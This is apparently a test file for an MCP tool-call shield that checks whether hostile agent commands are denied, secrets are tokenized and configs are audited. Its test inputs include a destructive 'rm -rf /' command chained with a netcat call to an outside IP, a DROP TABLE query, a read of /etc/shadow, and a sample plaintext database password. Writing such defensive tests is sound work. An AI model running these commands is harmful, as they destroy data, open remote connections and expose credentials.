/**
 * Test: Bartholomew Vault In-Process Model Context Protocol (MCP) Safety Shield
 */

const assert = require('assert');
const path = require('path');
const { VaultEngine } = require('../packages/bartholomew-vault/dist/vault_engine');

function runMcpShieldTests() {
  const engine = new VaultEngine();
  console.log('[*] Initializing Bartholomew Vault MCP Shield Tests...');

  // Warm up V8 JIT compiler
  engine.interceptMcpToolCall('noop', { test: 'warmup' });

  // Test 1: Destructive Shell Breakout Interception (<35µs)
  const shellCall = engine.interceptMcpToolCall('execute_command', {
    command: 'rm -rf / --no-preserve-root && nc 198.51.100.1 4444'
  });
  assert.strictEqual(shellCall.allowed, false, 'Shell breakout must be DENIED');
  assert.strictEqual(shellCall.verdict, 'DENY');
  assert.strictEqual(shellCall.rule_id, 'BTP-MCP-INV-001');
  assert.ok(shellCall.latencyUs < 250, `Latency must be sub-millisecond (got ${shellCall.latencyUs}µs)`);
  console.log(`[+] Test 1 Passed: Intercepted rm -rf in ${shellCall.latencyUs.toFixed(1)}µs (BTP-MCP-INV-001).`);

  // Test 2: Destructive SQL Injection Interception
  const sqlCall = engine.interceptMcpToolCall('query_database', {
    query: 'DROP TABLE customer_records; SELECT 1;'
  });
  assert.strictEqual(sqlCall.allowed, false, 'DROP TABLE must be DENIED');
  assert.strictEqual(sqlCall.verdict, 'DENY');
  assert.strictEqual(sqlCall.rule_id, 'BTP-MCP-INV-002');
  console.log(`[+] Test 2 Passed: Intercepted DROP TABLE in ${sqlCall.latencyUs.toFixed(1)}µs (BTP-MCP-INV-002).`);

  // Test 3: Path Traversal Toward Sensitive System Credentials
  const traversalCall = engine.interceptMcpToolCall('read_file', {
    path: '/etc/shadow'
  });
  assert.strictEqual(traversalCall.allowed, false, '/etc/shadow traversal must be DENIED');
  assert.strictEqual(traversalCall.verdict, 'DENY');
  assert.strictEqual(traversalCall.rule_id, 'BTP-MCP-INV-003');
  console.log(`[+] Test 3 Passed: Intercepted /etc/shadow traversal in ${traversalCall.latencyUs.toFixed(1)}µs (BTP-MCP-INV-003).`);

  // Test 4: Secret Tokenization on Outbound Tool Call
  const canaryKey = ['sk', 'live', '9981248TestStripeCanaryKeyForVaultMcp'].join('_');
  const outboundCall = engine.interceptMcpToolCall('web_search', {
    query: `Check docs for key ${canaryKey}`
  }, { isAuthorizedDestination: false });

  assert.strictEqual(outboundCall.allowed, true);
  assert.strictEqual(outboundCall.verdict, 'PERMIT');
  assert.strictEqual(outboundCall.tokensVaulted, 1);
  assert.ok(!outboundCall.sanitizedArgs.query.includes(canaryKey), 'Plaintext key must not be exposed');
  assert.ok(outboundCall.sanitizedArgs.query.includes('sk_live_BTP_VAULT_'), 'Must contain format-preserving surrogate');
  console.log(`[+] Test 4 Passed: Tokenized outbound secret into format-preserving surrogate in ${outboundCall.latencyUs.toFixed(1)}µs.`);

  // Test 5: JIT Detokenization on Authorized Internal Tool Execution
  const surrogate = outboundCall.sanitizedArgs.query.match(/sk_live_BTP_VAULT_[A-Z0-9]+/)[0];
  const authorizedCall = engine.interceptMcpToolCall('stripe_api_request', {
    authHeader: `Bearer ${surrogate}`
  }, { isAuthorizedDestination: true });

  assert.strictEqual(authorizedCall.allowed, true);
  assert.strictEqual(authorizedCall.tokensDetokenized, 1);
  assert.ok(authorizedCall.sanitizedArgs.authHeader.includes(canaryKey), 'Surrogate must be detokenized JIT locally');
  console.log(`[+] Test 5 Passed: JIT Detokenized surrogate back to raw secret at authorized boundary.`);

  // Test 6: MCP Configuration Auditing
  const sampleMcpConfig = JSON.stringify({
    mcpServers: {
      "postgres-prod": {
        "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-postgres"],
        "env": {
          "DATABASE_URL": "postgres://admin:SuperPass123!@db-prod.internal:5432/corp"
        }
      },
      "filesystem": {
        "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-filesystem", "."],
        "bartholomewShield": true
      }
    }
  });

  const auditReport = engine.auditMcpConfiguration(sampleMcpConfig);
  assert.strictEqual(auditReport.serverCount, 2);
  assert.ok(auditReport.totalUnvaultedSecrets >= 1, 'Should detect plaintext DB URI in postgres-prod');
  assert.strictEqual(auditReport.servers[1].isShielded, true, 'Filesystem server is marked shielded');
  console.log(`[+] Test 6 Passed: Audited MCP config, detected ${auditReport.totalUnvaultedSecrets} unvaulted secrets, overall score: ${auditReport.overallScore}/100.`);

  console.log('[*] ALL 6 BARTHOLOMEW MCP SHIELD TESTS PASSED (100% IN-PROCESS).');
}

runMcpShieldTests();
